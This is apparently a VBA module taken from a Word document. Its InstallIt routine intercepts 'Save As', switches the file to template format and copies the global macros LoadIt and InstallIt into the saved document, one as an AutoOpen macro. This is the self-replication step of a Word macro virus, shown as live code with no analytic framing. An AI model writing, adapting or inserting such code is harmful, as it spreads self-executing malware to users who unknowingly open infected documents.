   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "InstallIt"

   Public Sub MAIN()
   Dim sMe$
   Dim sTMacro$
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   On Error GoTo -1: On Error GoTo Bail
   WordBasic.CurValues.FileSaveAs dlg
   WordBasic.Dialog.FileSaveAs dlg
   If dlg.Format = 0 Then dlg.Format = 1
   sMe$ = WordBasic.[FileName$]()
   sTMacro$ = sMe$ + ":AutoOpen"
   WordBasic.MacroCopy "Global:LoadIt", sTMacro$
   sTMacro$ = sMe$ + ":LoadIt"
   WordBasic.MacroCopy "Global:LoadIt", sTMacro$
   sTMacro$ = sMe$ + ":InstallIt"
   WordBasic.MacroCopy "Global:InstallIt", sTMacro$
   WordBasic.FileSaveAs dlg
   GoTo Done

   Bail:
   If Err.Number <> 102 Then
       WordBasic.FileSaveAs dlg
   End If
   Done:

   End Sub
